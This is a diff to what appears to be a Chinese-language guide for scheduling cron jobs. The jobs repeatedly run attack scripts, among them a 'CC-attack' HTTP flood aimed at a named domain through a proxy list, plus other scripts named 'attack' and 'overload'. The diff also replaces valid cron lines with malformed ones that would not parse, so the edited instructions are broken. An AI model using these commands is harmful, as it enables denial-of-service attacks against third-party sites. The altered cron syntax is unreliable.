@@ -82,8 +82,8 @@ crontab -e
 
 ## 插入的计划任务
 ```shell
-2 */12 * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/proxy.txt -v 5 -s 30
-5 */4 * * * python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
+*/12+2 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/proxy.txt -v 5 -s 30
+*/4+5 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
 0 * * * * python3 ~/overload/overload_p.py
 ```
 - 编辑完成后按esc退出编辑
